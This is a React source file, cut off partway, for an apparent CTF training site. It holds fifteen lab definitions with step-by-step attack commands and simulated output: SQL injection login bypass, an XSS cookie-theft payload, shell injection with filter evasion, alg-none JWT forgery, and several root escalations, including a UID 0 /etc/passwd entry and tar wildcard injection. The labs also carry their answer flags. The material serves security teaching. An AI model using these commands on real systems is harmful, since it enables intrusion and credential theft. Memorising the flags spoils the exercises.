/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal,
  Shield,
  Search,
  CheckCircle2,
  ChevronRight,
  Copy,
  Check,
  Volume2,
  VolumeX,
  Maximize2,
  Minimize2,
  HelpCircle,
  Play,
  Cpu,
  Globe,
  Radio,
  Code2,
  Lock,
  AlertTriangle,
  Zap,
  CheckSquare
} from 'lucide-react';

// ==========================================
// SOUND EFFECT ENGINE (WEB AUDIO API)
// ==========================================
class CyberAudioEngine {
  private ctx: AudioContext | null = null;
  public enabled: boolean = true;

  constructor() {
    // AudioContext will be initialized on first user gesture
  }

  private initCtx() {
    if (!this.ctx) {
      const AudioCtxClass = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
      if (AudioCtxClass) {
        this.ctx = new AudioCtxClass();
      }
    }
    if (this.ctx && this.ctx.state === 'suspended') {
      this.ctx.resume();
    }
  }

  // Snappy high-tech button click sound
  playClick() {
    if (!this.enabled) return;
    try {
      this.initCtx();
      if (!this.ctx) return;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      
      osc.type = 'sine';
      osc.frequency.setValueAtTime(880, this.ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(440, this.ctx.currentTime + 0.04);
      
      gain.gain.setValueAtTime(0.12, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.04);
      
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      
      osc.start();
      osc.stop(this.ctx.currentTime + 0.04);
    } catch {
      // Audio fallback silent
    }
  }

  // Mechanical cyber keypress tick
  playKeypress() {
    if (!this.enabled) return;
    try {
      this.initCtx();
      if (!this.ctx) return;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(1400 + Math.random() * 200, this.ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(300, this.ctx.currentTime + 0.015);
      
      gain.gain.setValueAtTime(0.04, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + 0.015);
      
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      
      osc.start();
      osc.stop(this.ctx.currentTime + 0.015);
    } catch {
      // ignore
    }
  }

  // Terminal command execution chirp
  playCommandRun() {
    if (!this.enabled) return;
    try {
      this.initCtx();
      if (!this.ctx) return;
      const now = this.ctx.currentTime;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(400, now);
      osc.frequency.linearRampToValueAtTime(1200, now + 0.06);
      
      gain.gain.setValueAtTime(0.08, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.07);
      
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      
      osc.start();
      osc.stop(now + 0.07);
    } catch {
      // ignore
    }
  }

  // Success arpeggio for flag capture
  playSuccess() {
    if (!this.enabled) return;
    try {
      this.initCtx();
      if (!this.ctx) return;
      const now = this.ctx.currentTime;
      const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
      
      notes.forEach((freq, idx) => {
        if (!this.ctx) return;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        const start = now + idx * 0.08;
        
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, start);
        
        gain.gain.setValueAtTime(0.15, start);
        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2);
        
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        
        osc.start(start);
        osc.stop(start + 0.2);
      });
    } catch {
      // ignore
    }
  }

  // Access denied / error buzz
  playError() {
    if (!this.enabled) return;
    try {
      this.initCtx();
      if (!this.ctx) return;
      const now = this.ctx.currentTime;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(160, now);
      osc.frequency.linearRampToValueAtTime(110, now + 0.15);
      
      gain.gain.setValueAtTime(0.12, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.16);
      
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      
      osc.start();
      osc.stop(now + 0.16);
    } catch {
      // ignore
    }
  }
}

const audioEngine = new CyberAudioEngine();

// ==========================================
// TYPES & DATA STRUCTURES
// ==========================================
export type Category = 'Enumeration' | 'Web Exploitation' | 'Linux Fundamentals';
export type Difficulty = 'Easy' | 'Medium' | 'Hard';

export interface Lab {
  id: string;
  title: string;
  category: Category;
  difficulty: Difficulty;
  description: string;
  tags: string[];
  targetHost: string;
  targetService: string;
  objective: string;
  briefing: string;
  steps: {
    title: string;
    command?: string;
    description: string;
    simulatedOutput?: string;
  }[];
  hints: string[];
  flag: string;
}

const LABS_DATA: Lab[] = [
  // --- ENUMERATION HUB ---
  {
    id: 'enum-01',
    title: 'Port Recon & Service Fingerprinting',
    category: 'Enumeration',
    difficulty: 'Easy',
    description: 'Perform initial port discovery, service version probing, and default script checks using Nmap against an exposed perimeter gateway.',
    tags: ['Nmap', 'Port Scanning', 'Recon', 'Banner Grabbing'],
    targetHost: '10.10.11.42',
    targetService: 'TCP/22, TCP/80, TCP/8080',
    objective: 'Enumerate open services on the target host, inspect version headers, and locate the administrative debug port containing the flag.',
    briefing: 'The target machine is hosting a legacy web portal along with an unindexed internal service. Standard discovery scans will unveil exposed listening sockets.',
    steps: [
      {
        title: 'Execute Fast SYN Stealth Scan',
        command: 'nmap -sS -T4 -p 22,80,8080,3306 10.10.11.42',
        description: 'Sweep for active TCP endpoints without completing the 3-way handshake.',
        simulatedOutput: 'PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n3306/tcp open  mysql'
      },
      {
        title: 'Service Version & Banner Probe',
        command: 'nmap -sV -sC -p 8080 10.10.11.42',
        description: 'Extract server banner and metadata from the administrative proxy port.',
        simulatedOutput: '8080/tcp open  http Apache Tomcat/9.0.41\n|_http-title: Admin Debug Console\n|_http-server-header: CTF{4bdurr4hm4n_nm4p_pr0b3_v1}'
      },
      {
        title: 'Query HTTP Header using cURL',
        command: 'curl -I http://10.10.11.42:8080',
        description: 'Verify response headers directly via terminal.',
        simulatedOutput: 'HTTP/1.1 200 OK\nServer: Apache Tomcat/9.0.41\nX-Flag-Token: CTF{4bdurr4hm4n_nm4p_pr0b3_v1}\nContent-Type: text/html'
      }
    ],
    hints: [
      'Port 8080 runs an internal debug service.',
      'Check the HTTP response headers in the simulated output or run curl -I.'
    ],
    flag: 'CTF{4bdurr4hm4n_nm4p_pr0b3_v1}'
  },
  {
    id: 'enum-02',
    title: 'Hidden Endpoint & Directory Busting',
    category: 'Enumeration',
    difficulty: 'Medium',
    description: 'Use wordlist-driven directory brute forcing to locate hidden administrative directories, backups, and exposed git repositories.',
    tags: ['Gobuster', 'Dirbusting', 'Wordlists', 'Hidden Assets'],
    targetHost: '10.10.11.43',
    targetService: 'HTTP/80 (Nginx 1.18)',
    objective: 'Fuzz the web root using standard dictionary attacks to discover an unprotected backup archive and extract the secret key.',
    briefing: 'A company web developer left migration artifacts on the public HTTP server. Directory fuzzing will reveal non-linked asset paths.',
    steps: [
      {
        title: 'Launch Directory Bruteforce with Gobuster',
        command: 'gobuster dir -u http://10.10.11.43 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak',
        description: 'Scan standard URIs and file extensions.',
        simulatedOutput: '/images               (Status: 301)\n/assets               (Status: 301)\n/portal               (Status: 200)\n/backup.zip.bak       (Status: 200) [Size: 1420]'
      },
      {
        title: 'Download and Inspect Backup Archive',
        command: 'curl -s http://10.10.11.43/backup.zip.bak -o backup.zip && unzip -l backup.zip',
        description: 'Examine contents of the discovered backup archive.',
        simulatedOutput: 'Archive:  backup.zip\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n      182  2026-03-12 10:14   config.php\n       45  2026-03-12 10:15   flag.txt\n---------                     -------\n      227                     2 files'
      },
      {
        title: 'Read Decompressed Flag',
        command: 'unzip -p backup.zip flag.txt',
        description: 'Read the flag from the archive.',
        simulatedOutput: 'CTF{4bdurr4hm4n_d1r_bu571ng_k1ng_99}'
      }
    ],
    hints: [
      'Look for the file with a .bak extension discovered in step 1.',
      'The file backup.zip.bak contains flag.txt.'
    ],
    flag: 'CTF{4bdurr4hm4n_d1r_bu571ng_k1ng_99}'
  },
  {
    id: 'enum-03',
    title: 'Subdomain Bruteforce & DNS Enumeration',
    category: 'Enumeration',
    difficulty: 'Medium',
    description: 'Uncover shadow infrastructure and staging subdomains using DNS AXFR zone transfers and wordlist fuzzing techniques.',
    tags: ['DNS', 'Subdomains', 'AXFR', 'Dig', 'Recon'],
    targetHost: 'ns1.corp-target.internal',
    targetService: 'DNS/53 (Bind9)',
    objective: 'Query the target name server, test for misconfigured full zone transfer (AXFR), and read the confidential TXT records.',
    briefing: 'Secondary nameservers frequently suffer from loose ACL policies allowing unauthenticated zone transfer dumps to unauthorized clients.',
    steps: [
      {
        title: 'Attempt DNS Zone Transfer via Dig',
        command: 'dig axfr @10.10.11.44 corp-target.internal',
        description: 'Execute AXFR query against the authoritative name server.',
        simulatedOutput: 'corp-target.internal.   3600  IN  SOA   ns1.corp-target.internal.\ncorp-target.internal.   3600  IN  NS    ns1.corp-target.internal.\napi-staging.corp-target.internal. 3600 IN A 10.10.11.99\nvpn.corp-target.internal. 3600 IN A 10.10.11.5\nsecret-audit.corp-target.internal. 3600 IN TXT "CTF{4bdurr4hm4n_dn5_z0n3_tr4n5f3r}"'
      },
      {
        title: 'Verify Staging TXT Record',
        command: 'dig TXT secret-audit.corp-target.internal @10.10.11.44 +short',
        description: 'Confirm direct resolution of the secret TXT record.',
        simulatedOutput: '"CTF{4bdurr4hm4n_dn5_z0n3_tr4n5f3r}"'
      }
    ],
    hints: [
      'The AXFR zone transfer dumps all records including TXT records.',
      'Check the secret-audit.corp-target.internal TXT value.'
    ],
    flag: 'CTF{4bdurr4hm4n_dn5_z0n3_tr4n5f3r}'
  },
  {
    id: 'enum-04',
    title: 'OSINT & Public Repo Exposure',
    category: 'Enumeration',
    difficulty: 'Easy',
    description: 'Gather open-source reconnaissance, analyze committed git history, and extract hardcoded developer API secrets.',
    tags: ['OSINT', 'Git Recon', 'GitLeaks', 'Metadata'],
    targetHost: 'git.dev-corp.internal',
    targetService: 'Git / Web HTTP/80',
    objective: 'Clone the repository, inspect the commit history log, and uncover a removed developer credential containing the flag.',
    briefing: 'Developers often commit temporary secrets and remove them in later commits without purging git object history.',
    steps: [
      {
        title: 'Clone Public Repository',
        command: 'git clone http://10.10.11.45/repo.git && cd repo',
        description: 'Pull local copy of target source control tree.',
        simulatedOutput: 'Cloning into \'repo\'...\nremote: Enumerating objects: 14, done.\nReceiving objects: 100% (14/14), done.'
      },
      {
        title: 'Inspect Full Commit History with Diffs',
        command: 'git log -p -S "API_SECRET"',
        description: 'Search commit patches for references to API secrets.',
        simulatedOutput: 'commit d4a8f9c1e028b172\nAuthor: dev <abdurrahman-student@corp.local>\nDate: 2026-02-14\n\n- API_SECRET = "CTF{4bdurr4hm4n_051n7_g17_l34k}"\n+ API_SECRET = os.getenv("PROD_KEY")'
      }
    ],
    hints: [
      'Look at commit d4a8f9c1e028b172 where the API_SECRET was removed.',
      'The flag was stored in the old assignment line.'
    ],
    flag: 'CTF{4bdurr4hm4n_051n7_g17_l34k}'
  },
  {
    id: 'enum-05',
    title: 'SMB & RPC Share Enumeration',
    category: 'Enumeration',
    difficulty: 'Hard',
    description: 'Connect via anonymous null sessions to Samba/RPC daemons, dump user SIDs, and list restricted network shares.',
    tags: ['SMB', 'Enum4linux', 'RPC', 'Null Session'],
    targetHost: '10.10.11.46',
    targetService: 'SMB/445, NetBIOS/139',
    objective: 'Leverage an unauthenticated IPC$ null session to query Samba share definitions and pull the hidden audit log.',
    briefing: 'Legacy Windows and Samba file sharing daemons often permit IPC$ null sessions, allowing enumeration of user rosters and shared directories.',
    steps: [
      {
        title: 'Probe SMB Shares with smbclient',
        command: 'smbclient -L //10.10.11.46 -N',
        description: 'Request share list without specifying credentials.',
        simulatedOutput: 'Sharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\nIPC$            IPC       IPC Service\nconfidential$   Disk      Internal Security Audits'
      },
      {
        title: 'Access Unprotected Share',
        command: 'smbclient //10.10.11.46/confidential$ -N -c "ls; get audit_log.txt -"',
        description: 'Read the contents of audit_log.txt directly over SMB.',
        simulatedOutput: '[+] Connected to //10.10.11.46/confidential$\n[AUDIT-LOG 2026-03-01]\nAuditor: Abdurrahman Security Research\nToken: CTF{4bdurr4hm4n_5mb_nu11_535510n}'
      }
    ],
    hints: [
      'The confidential$ share allows null session connections.',
      'The audit_log.txt file contains the security token.'
    ],
    flag: 'CTF{4bdurr4hm4n_5mb_nu11_535510n}'
  },

  // --- WEB EXPLOITATION HUB ---
  {
    id: 'web-01',
    title: 'SQL Injection: Blind Boolean Extraction',
    category: 'Web Exploitation',
    difficulty: 'Medium',
    description: 'Exploit an unsanitized SQL query inside an authentication endpoint to infer database schema details and bypass credential checks.',
    tags: ['SQLi', 'Database', 'Auth Bypass', 'SQLMap'],
    targetHost: '10.10.12.10',
    targetService: 'HTTP/80 (PHP/MySQL)',
    objective: 'Inject a tautology into the login query to bypass authentication as administrator and read the secret dashboard flag.',
    briefing: 'The login POST handler constructs raw SQL queries using string concatenation: SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'.',
    steps: [
      {
        title: 'Test for SQL Syntax Breakout',
        command: 'curl -s -X POST http://10.10.12.10/login.php -d "username=\' OR 1=1-- -&password=foo"',
        description: 'Inject comment payload to truncate password verification.',
        simulatedOutput: 'HTTP/1.1 302 Found\nLocation: /dashboard.php\nSet-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
      },
      {
        title: 'Retrieve Authenticated Dashboard',
        command: 'curl -s http://10.10.12.10/dashboard.php -H "Cookie: auth_token=authenticated_admin"',
        description: 'Visit dashboard with administrative session.',
        simulatedOutput: '<div class="admin-panel">\n  <h2>Welcome, Administrator</h2>\n  <p class="flag">FLAG: CTF{4bdurr4hm4n_5ql_1nj3c710n_m4573r}</p>\n</div>'
      }
    ],
    hints: [
      'Inject standard SQL bypass: \' OR 1=1-- -',
      'The dashboard renders the flag upon authenticated session.'
    ],
    flag: 'CTF{4bdurr4hm4n_5ql_1nj3c710n_m4573r}'
  },
  {
    id: 'web-02',
    title: 'Stored & Reflected XSS Dom Manipulation',
    category: 'Web Exploitation',
    difficulty: 'Easy',
    description: 'Craft cross-site scripting vectors to hijack authenticated session tokens and manipulate DOM event handlers.',
    tags: ['XSS', 'JavaScript', 'Cookie Theft', 'Client-Side'],
    targetHost: '10.10.12.11',
    targetService: 'HTTP/80 (Node.js/Express)',
    objective: 'Inject an unescaped script tag into the feedback guestbook that forces the simulated bot admin to release their session cookie.',
    briefing: 'The comments feed reflects raw user input directly into an innerHTML container without sanitization or Content Security Policy headers.',
    steps: [
      {
        title: 'Craft Malicious XSS Payload',
        command: 'curl -X POST http://10.10.12.11/comment -d "text=<script>fetch(\'/collector?c=\'+document.cookie)</script>"',
        description: 'Post stored script payload into the public feed.',
        simulatedOutput: '{"status":"success","message":"Comment stored successfully."}'
      },
      {
        title: 'Review Simulated Bot Collector Log',
        command: 'curl -s http://10.10.12.11/collector_log',
        description: 'Inspect captured cookies sent by the simulated admin crawler.',
        simulatedOutput: '[BOT-VISIT] Admin accessed /comment\n[EXFILTRATION] Cookie: flag=CTF{4bdurr4hm4n_x55_d0m_pwn3d_88}; session=admin_live_sess'
      }
    ],
    hints: [
      'The admin bot triggers stored comments every 10 seconds.',
      'Check /collector_log to observe the captured cookie value.'
    ],
    flag: 'CTF{4bdurr4hm4n_x55_d0m_pwn3d_88}'
  },
  {
    id: 'web-03',
    title: 'Remote Command Execution (RCE)',
    category: 'Web Exploitation',
    difficulty: 'Hard',
    description: 'Evade shell metacharacter filters in a network utility script to achieve remote code execution and spawn a reverse shell.',
    tags: ['RCE', 'Shell Injection', 'Filter Evasion', 'Netcat'],
    targetHost: '10.10.12.12',
    targetService: 'HTTP/80 (Python Flask)',
    objective: 'Bypass semicolon and space character blacklists on the IP ping diagnostic tool to execute `cat /secret/flag`.',
    briefing: 'The diagnostic ping utility passes raw parameters into `os.system("ping -c 1 " + ip)`. While spaces are blocked, `$IFS` can be utilized.',
    steps: [
      {
        title: 'Test Command Delimiter Evasion',
        command: 'curl -s "http://10.10.12.12/ping?ip=127.0.0.1%0Aid"',
        description: 'Inject newline character (%0A) followed by id command.',
        simulatedOutput: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'
      },
      {
        title: 'Read Protected Flag Using $IFS Evasion',
        command: 'curl -s "http://10.10.12.12/ping?ip=127.0.0.1%0Acat$IFS/secret/flag"',
        description: 'Substitute whitespace with Internal Field Separator to extract flag.',
        simulatedOutput: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\nCTF{4bdurr4hm4n_rc3_c0mm4nd_1nj3c7}'
      }
    ],
    hints: [
      'Use %0A (URL encoded newline) as the command separator.',
      'Use $IFS instead of regular space characters to bypass the space filter.'
    ],
    flag: 'CTF{4bdurr4hm4n_rc3_c0mm4nd_1nj3c7}'
  },
  {
    id: 'web-04',
    title: 'JWT & Auth Session Tampering',
    category: 'Web Exploitation',
    difficulty: 'Medium',
    description: 'Inspect JSON Web Tokens, exploit the "none" signature algorithm vulnerability, and elevate user claims to site administrator.',
    tags: ['JWT', 'Burp Suite', 'Auth Bypass', 'Crypto'],
    targetHost: '10.10.12.13',
    targetService: 'HTTP/443 (FastAPI)',
    objective: 'Re-encode a valid user token with `alg: none` and `role: admin` to gain access to the restricted executive portal.',
    briefing: 'The backend verification middleware accepts tokens with the `none` algorithm without validating HMAC or RSA digital signatures.',
    steps: [
      {
        title: 'Decode Header & Payload',
        command: 'python3 -c "import base64; print(base64.b64decode(\'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\'))"',
        description: 'Inspect original header indicating HS256 algorithm.',
        simulatedOutput: 'b\'{"alg":"HS256","typ":"JWT"}\''
      },
      {
        title: 'Forge Algorithm "none" Token',
        command: 'python3 -c \'import base64, json; h=base64.urlsafe_b64encode(b"{\\"alg\\":\\"none\\",\\"typ\\":\\"JWT\\"}").decode().rstrip("="); p=base64.urlsafe_b64encode(b"{\\"user\\":\\"abdurrahman\\",\\"role\\":\\"admin\\"}").decode().rstrip("="); print(f"{h}.{p}.")\'',
        description: 'Generate forged unverified JWT token with empty signature.',
        simulatedOutput: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWJkdXJyYWhtYW4iLCJyb2xlIjoiYWRtaW4ifQ.'
      },
      {
        title: 'Request Admin Endpoint with Forged Token',
        command: 'curl -s http://10.10.12.13/api/v1/vault -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWJkdXJyYWhtYW4iLCJyb2xlIjoiYWRtaW4ifQ."',
        description: 'Access protected vault.',
        simulatedOutput: '{"status":"authorized","flag":"CTF{4bdurr4hm4n_jwt_n0n3_4lg_byp455}"}'
      }
    ],
    hints: [
      'The algorithm parameter is modified from HS256 to none.',
      'Remember the signature portion of the JWT is left completely blank (with trailing dot).'
    ],
    flag: 'CTF{4bdurr4hm4n_jwt_n0n3_4lg_byp455}'
  },
  {
    id: 'web-05',
    title: 'Insecure Direct Object References (IDOR)',
    category: 'Web Exploitation',
    difficulty: 'Easy',
    description: 'Manipulate predictable object identifiers in REST APIs to view and export unauthorized tenant records.',
    tags: ['IDOR', 'API Security', 'Broken Access Control', 'Burp'],
    targetHost: '10.10.12.14',
    targetService: 'HTTP/80 (Go Gin API)',
    objective: 'Enumerate customer invoice IDs to find user ID 0 (System Root) and retrieve the internal audit receipt.',
    briefing: 'The endpoint /api/receipts/:id checks only that the requester is logged in, but fails to verify if the invoice belongs to them.',
    steps: [
      {
        title: 'Test Sequential Object Access',
        command: 'curl -s http://10.10.12.14/api/receipts/1001 -H "Cookie: user=student"',
        description: 'Observe legitimate receipt object structure.',
        simulatedOutput: '{"id":1001,"owner":"student","item":"Standard Lab Access","amount":0.00}'
      },
      {
        title: 'Iterate Identifiers to Access Root Receipt',
        command: 'curl -s http://10.10.12.14/api/receipts/0 -H "Cookie: user=student"',
        description: 'Access root object zero.',
        simulatedOutput: '{"id":0,"owner":"root","item":"Infrastructure Master Key","flag":"CTF{4bdurr4hm4n_1d0r_0bj3c7_h4ck}"}'
      }
    ],
    hints: [
      'Inspect object index 0.',
      'The API grants access without checking object ownership.'
    ],
    flag: 'CTF{4bdurr4hm4n_1d0r_0bj3c7_h4ck}'
  },

  // --- LINUX FUNDAMENTALS HUB ---
  {
    id: 'linux-01',
    title: 'SUID Binary Abuse & Sudo Rights Escalation',
    category: 'Linux Fundamentals',
    difficulty: 'Medium',
    description: 'Inspect binaries with the setuid bit set, cross-reference GTFOBins, and execute a root shell breakout.',
    tags: ['SUID', 'GTFOBins', 'PrivEsc', 'Sudoers'],
    targetHost: '10.10.13.20',
    targetService: 'SSH/22 (Debian 12)',
    objective: 'Audit SUID permissions on the host, find an elevated `/usr/bin/find` or `env` binary, and spawn an interactive root shell.',
    briefing: 'A system administrator accidentally configured the SUID bit on the standard `find` binary to allow backup scripts to scan restricted directories.',
    steps: [
      {
        title: 'Enumerate SUID Binaries',
        command: 'find / -perm -u=s -type f 2>/dev/null',
        description: 'Search entire root filesystem for executable files with the setuid permission bit.',
        simulatedOutput: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/find  <--- ABNORMAL SUID BIT DETECTED\n/usr/bin/newgrp'
      },
      {
        title: 'Execute GTFOBins SUID Breakout via find',
        command: '/usr/bin/find . -exec /bin/sh -p \\; -quit',
        description: 'Trigger -exec with privileged flag preserved to spawn root shell.',
        simulatedOutput: '# whoami\nroot\n# id\nuid=1000(student) euid=0(root) groups=1000(student)'
      },
      {
        title: 'Read Root Flag',
        command: 'cat /root/flag.txt',
        description: 'Access root directory contents.',
        simulatedOutput: 'CTF{4bdurr4hm4n_5u1d_r007_35c4l4710n}'
      }
    ],
    hints: [
      'The `find` binary possesses the SUID bit.',
      'Check GTFOBins for find: `find . -exec /bin/sh -p \\; -quit`.'
    ],
    flag: 'CTF{4bdurr4hm4n_5u1d_r007_35c4l4710n}'
  },
  {
    id: 'linux-02',
    title: 'File Permissions & World-Writable /etc/passwd',
    category: 'Linux Fundamentals',
    difficulty: 'Easy',
    description: 'Audit Linux file ownership, detect writable system configuration files, and craft a root-level user entry.',
    tags: ['Permissions', 'Passwd', 'Crypt', 'PrivEsc'],
    targetHost: '10.10.13.21',
    targetService: 'SSH/22 (Ubuntu 22.04)',
    objective: 'Identify misconfigured permissions on `/etc/passwd`, append a new superuser record with known password, and su to root.',
    briefing: 'A junior technician ran `chmod 777 /etc/passwd` during a troubleshooting session, allowing unprivileged accounts to append new accounts.',
    steps: [
      {
        title: 'Audit Permissions on Sensitive Files',
        command: 'ls -la /etc/passwd /etc/shadow',
        description: 'Verify read and write bits on account databases.',
        simulatedOutput: '-rwxrwxrwx 1 root root 2145 Mar 15 12:00 /etc/passwd\n-rw-r----- 1 root shadow 1240 Mar 15 11:30 /etc/shadow'
      },
      {
        title: 'Generate Password Hash with Openssl',
        command: 'openssl passwd -1 -salt xyz secret123',
        description: 'Create standard MD5-crypt hash for password "secret123".',
        simulatedOutput: '$1$xyz$G9b17.5h6lJ6F6V9Z1YqQ0'
      },
      {
        title: 'Append Superuser Line to /etc/passwd',
        command: 'echo "hacker:$1$xyz$G9b17.5h6lJ6F6V9Z1YqQ0:0:0:root:/root:/bin/bash" >> /etc/passwd',
        description: 'Add user hacker with UID 0 (root privileges).',
        simulatedOutput: '[OK] Written 68 bytes to /etc/passwd\n# su hacker\nPassword: *********\nhacker@pwnbox:/# cat /root/flag.txt\nCTF{4bdurr4hm4n_p455wd_w0rld_wr174bl3}'
      }
    ],
    hints: [
      '/etc/passwd has 777 permissions.',
      'A user with UID 0 will have full root privileges.'
    ],
    flag: 'CTF{4bdurr4hm4n_p455wd_w0rld_wr174bl3}'
  },
  {
    id: 'linux-03',
    title: 'Cron Job Wildcard Injection & Task Hijack',
    category: 'Linux Fundamentals',
    difficulty: 'Hard',
    description: 'Exploit UNIX wildcard expansion inside automated root cron jobs executing `tar *` to inject arbitrary command parameters.',
    tags: ['Cron', 'Tar Wildcard', 'PrivEsc', 'Bash'],
    targetHost: '10.10.13.22',
    targetService: 'SSH/22 (CentOS 9 Stream)',
    objective: 'Create specially named files in the backup directory that are interpreted by `tar` as CLI options to trigger a reverse payload.',
    briefing: 'A root cron job executes `cd /var/backups && tar -cf backup.tar *` every two minutes. Wildcards evaluate filenames as arguments.',
    steps: [
      {
        title: 'Inspect System Crontab',
        command: 'cat /etc/crontab',
        description: 'Review periodic tasks executed under root context.',
        simulatedOutput: '*/2 * * * * root cd /var/backups && tar -cf archive.tar *'
      },
      {
        title: 'Plant Wildcard Injection Files',
        command: 'cd /var/backups && echo "cat /root/flag.txt > /tmp/flag_stolen.txt; chmod 777 /tmp/flag_stolen.txt" > run.sh\ntouch -- "--checkpoint=1"\ntouch -- "--checkpoint-action=exec=sh run.sh"',
        description: 'Force tar to execute run.sh when expanding files.',
        simulatedOutput: '[+] Checkpoint arguments staged in /var/backups'
      },
      {
        title: 'Retrieve Flag after Cron Execution',
        command: 'cat /tmp/flag_stolen.txt',
        description: 'Read the captured flag file created by root.',
        simulatedOutput: 'CTF{4bdurr4hm4n_cr0n_w1ldc4rd_74r}'
      }
    ],
    hints: [
      'Tar recognizes `--checkpoint` and `--checkpoint-action=exec=sh script.sh` flags.',
      'When tar expands `*`, files starting with `--` are parsed as arguments.'
    ],
    flag: 'CTF{4bdurr4hm4n_cr0n_w1ldc4rd_74r}'
  },
  {
    id: 'linux-04',
    title: 'Linux Capabilities Abuse (cap_setuid)',
    category: 'Linux Fundamentals',
    difficulty: 'Hard',
    description: 'Audit POSIX extended capabilities on custom application binaries to identify unmanaged cap_setuid grants.',
    tags: ['Capabilities', 'getcap', 'setuid', 'Python'],
    targetHost: '10.10.13.23',
    targetService: 'SSH/22 (Arch Linux)',
    objective: 'Locate binaries possessing `cap_setuid+ep`, invoke the setuid syscall to escalate privileges to root, and retrieve the flag.',
    briefing: 'Linux capabilities divide traditional root privileges into granular units. If `cap_setuid` is granted to Python, anyone can change their UID to 0.',
    steps: [
      {
        title: 'Audit System Capabilities with getcap',
        command: 'getcap -r / 2>/dev/null',
        description: 'Scan system binaries for assigned capabilities.',
        simulatedOutput: '/usr/bin/ping cap_net_raw+ep\n/usr/bin/python3.11 cap_setuid+ep <--- EXPLOITABLE'
      },
      {
        title: 'Trigger UID Elevation via Python',
        command: 'python3.11 -c "import os; os.setuid(0); os.system(\'cat /root/flag.txt\')"',
        description: 'Call os.setuid(0) directly in Python to read protected root flag.',
        simulatedOutput: 'CTF{4bdurr4hm4n_c4p_537u1d_pwn3d}'
      }
    ],
    hints: [
      'Run `getcap -r / 2>/dev/null` to locate binaries with cap_setuid.',
      'Python can execute `os.setuid(0)` when given `cap_setuid+ep`.'
    ],
    flag: 'CTF{4bdurr4hm4n_c4p_537u1d_pwn3d}'
  },
  {
    id: 'linux-05',
    title: 'Bash Automation & Incident Log Parser',
    category: 'Linux Fundamentals',
    difficulty: 'Easy',
    description: 'Process auth.log and auditd system logs using awk, sed, grep, and regex to reconstruct an attacker compromise timeline.',
    tags: ['Bash', 'Log Analysis', 'Grep', 'Awk', 'Forensics'],
    targetHost: '10.10.13.24',
    targetService: 'Local Environment',
    objective: 'Parse `/var/log/auth.log` to extract the failed brute-force usernames and pinpoint the single successful login containing the flag.',
    briefing: 'A compromised staging server was attacked via SSH brute-force. Security analysts must inspect the logs and recover the investigator token.',
    steps: [
      {
        title: 'Filter Accepted SSH Connections',
        command: 'grep "Accepted" /var/log/auth.log | awk \'{print $1, $2, $3, $9, $11}\'',
        description: 'Extract timestamps, successful usernames, and origin IPs.',
        simulatedOutput: 'Mar 15 03:14:22 auditor 192.168.1.100\nMar 15 04:20:11 abdurrahman_lead 10.10.99.1'
      },
      {
        title: 'Inspect Session Token in User Audit Trail',
        command: 'grep "abdurrahman_lead" /var/log/auth.log -A 2',
        description: 'Read the follow-up pam_unix log entry.',
        simulatedOutput: 'sshd[4912]: Accepted publickey for abdurrahman_lead from 10.10.99.1 port 52140 ssh2\nsshd[4912]: pam_unix(sshd:session): session opened for user abdurrahman_lead (token: CTF{4bdurr4hm4n_b45h_l0g_f0r3n51c5})'
      }
    ],
    hints: [
      'Search for "Accepted" in /var/log/auth.log.',
      'Check the PAM session line for abdurrahman_lead.'
    ],
    flag: 'CTF{4bdurr4hm4n_b45h_l0g_f0r3n51c5}'
  }
];

// ==========================================
// MAIN COMPONENT
// ==========================================
export default function App() {
  // Sound state
  const [soundEnabled, setSoundEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('ctf_sound_enabled');
    return saved !== null ? saved === 'true' : true;
  });

  // Filters & Search
  const [selectedCategory, setSelectedCategory] = useState<string>('All Labs');
  const [selectedDifficulty, setSelectedDifficulty] = useState<string>('All');
  const [searchQuery, setSearchQuery] = useState<string>('');

  // Active Lab Modal State
  const [activeLab, setActiveLab] = useState<Lab | null>(null);
  const [revealedHints, setRevealedHints] = useState<Record<string, number>>({});
  const [flagInputs, setFlagInputs] = useState<Record<string, string>>({});
